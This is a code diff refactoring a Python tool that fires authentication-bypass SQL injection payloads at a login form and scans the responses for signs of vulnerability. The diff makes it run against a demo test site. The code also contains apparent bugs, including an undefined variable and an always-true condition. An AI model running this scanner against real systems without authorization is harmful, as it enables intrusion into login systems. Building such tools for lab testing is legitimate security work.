@@ -10,23 +10,27 @@ import sqlite3
 # from database import create_database_for_Captures
 import os
 import sys
+current_directory = os.getcwd()
 
-lib_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'scripts'))
-sys.path.append(lib_path)
+sys.path.append(current_directory)
+
+
 import sys
 import os
 
-from headers import *
-
-
-
-from headers import *
+from lib.scripts.headers import *
 
 import logging
+from logger.logs import logger
+from lib.priority.Priority import PRIORITY
+from lib.priority.Priority import HARMFULL
+from lib.regelexpression.patterns import Detect
 
-############################################################################
+
+__priority__ = PRIORITY.MEDIUM
+__harmfull__ = HARMFULL.HIGH
+
 attack_type = "authentication bypass SQL injection"
-#############################################################################
 
 """
 Database Column List Enumeration Script
@@ -97,121 +101,76 @@ async def LIST_COLUMNS_ORACLE(urls):
             requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
             # url = "https://redtiger.labs.overthewire.org/level1.php"
             req = requests.get(url=urls,verify=False) 
-            # assert req.status_code == 200
             if req.status_code == 200: 
                 ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
-                logging.info(f"Could get a 200 request for the target: {urls} in the time : {datetime.now()}")
+                logger.info(f"payload is ready to send")
 
                 if ask.lower() == "y":
                     for line in sorted_payload.split("\n"): 
-                        #############################################################33
                         params = { 
                             "username": line,
                             "password": line
                         }
-                        ##############################################################################
-                        # print(line)
                         await Prepare_the_headers()
                         for headerR in headers:
                             ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
-                            print(f"[{datetime.now()}]|**[INFO]Current payload: | {Fore.RESET}{Style.BRIGHT}{line} |with status code|:{Fore.RESET}{Fore.BLUE}{ack.status_code}\n|Headers:|{header}**") 
-                            # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
+                            logger.info(f"Testing payload:{line}")
                             await asyncio.sleep(5) 
                             if "error" in ack.text: 
-                                print(f"[{datetime.now()}]{Fore.RESET}{Fore.LIGHTWHITE_EX}|**[INFO]Vulnerability found in the response code:|ack.text\n|Headers:|{header}**")
+                                logger.info("Error parameter might exists.")
+                                Detect(ack.text)
+                                await asyncio.sleep(3)
                                 
                             vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                             htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                             if vuln: 
-                                print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  | **Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
-                                logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
-                                await asyncio.sleep(3) 
-                            
+                                logger.info("id parameter might exists")          
+                                Detect(ack.text)
+                                await asyncio.sleep(3)
+
                             if htmlVULN:
-                                print(f"[{datetime.now()}] {Fore.RESET}{Fore.LIGHTMAGENTA_EX} |**Vulnerability found:|{Fore.RESET}{Fore.LIGHTBLUE_EX}{ack.text}|with the count of|:{Fore.RESET}{Fore.LIGHTMAGENTA_EX}{len(htmlVULN)}\n|Headers:**|{Fore.RESET}{Fore.LIGHTYELLOW_EX}{header}")
-                                logging.info(f"[INFO]Could find a vulnerability in the website html form:{urls} time:{datetime.now()} note:the vulnerability might not be that much significant.")
+                                logger.info("error parameter might exists")          
+                                Detect(ack.text)
                                 await asyncio.sleep(3)
                             
                             word = "id" in req.text                             
                             errword = "error" in req.text
                             if word:
-                                print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  |** Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
-                                logging.info(f"[INFO] vulnerability may exists in the target url(id parameters):{urls} attack type:{attack_type} in the time:{datetime.now()}")
+                                logger.info("Id parameter might exists.")
                                 await asyncio.sleep(3)
+                                Detect(ack.text)
                             
                             if errword:
-                                print(f"[{datetime.now()}]",Fore.RED + "|**Vulnerability found in the Error based attack Status|:","|" ,errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection","\n|Headers:**|",header)
-                                logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
+                                logger.info("Error parameter may exists")
                                 await asyncio.sleep(3)
+                                Detect(ack.text)
                                 
                             
                                 
                         if req.status_code == 302:                                             
-                            print(f"[{datetime.now()}]",Fore.GREEN+"**[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection","\n|Headers:**|",header)
-                            logging.info(f"Could bypass the authentication in the target:{urls} in the time:{datetime.now()}")
-                            done = True
+                            logger.info("Could inject a code:",line)
                         
                         if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
-                            print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]**Could connect to the website but did found injectable area on the website.","|Attack:|","authentication bypass SQL injection","\n|Headers:**|",headers)
-                            logging.info(f"Could not find any injectable significant area in the target:{urls} in the time:{datetime.now()}")
+                            logger.info("Admin parameter might exits")
+                            Detect(ack.text)
+                            await asyncio.sleep(3)
                             
                 else:
-                    print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection","\n|Headers:|",header)
-                    logging.error(f"Could not connect to the target:{urls} in the time:{datetime.now()}")
+                    logger.error("Host is down.")
             
-        # await create_database_for_Captures()
-        #############################################################################################################
     except Exception as e:
-        print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
+        logger.error(e)
         
-    except KeyboardInterrupt:
-        pass
-        
-    except ConnectionAbortedError as e:
-        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection aborted error:",e,"|Attack:|",attack_type)
-        
-    except ConnectionError as e:
-        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection error:",e,"|Attack:|",attack_type)
-        
-    except ConnectionRefusedError as e:
-        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection refused error:",e,"|Attack:|",attack_type)
-        
-    except ConnectionResetError as e:
-        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection reset error:",e,"|Attack:|",attack_type)
-        
-    except UnicodeEncodeError:
-        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] UnicodeEncodeError:",e,"|Attack:|",attack_type)
-    
-    except AssertionError:
-        pass
-        
-    except MemoryError:
-        """We handle the memory and RAM error in here to catch this exception """
-        import psutil
-        # Get the system memory information
-        memory = psutil.virtual_memory()
-
-        # Calculate the threshold for 80% memory usage
-        threshold = memory.total * 0.9
-
-        # Check if the used memory is greater than the threshold
-        Err =  memory.used <= threshold
-        while not Err:
-            memory = psutil.virtual_memory()
-            Err = memory.used <= threshold
-            print(Fore.RED+"[INFO]Please Release you RAM space to continue the application"+"|Attack:|",attack_type)
-            await asyncio.sleep(5)
-# asyncio.run(Memory_handling())
+ 
         
     finally:
-        pass
+        logger.info("Injection done.")
      
         
         
      
 
-async def auth_main(urL):
-    await auth_SQL_inj(urL)
+
 
 # asyncio.run(conditional_SQL_inj("http://testfire.net/login.jsp"))
-# asyncio.run(LIST_COLUMNS_ORACLE("http://testfire.net/login.jsp"))
+asyncio.run(LIST_COLUMNS_ORACLE("http://testfire.net/login.jsp"))
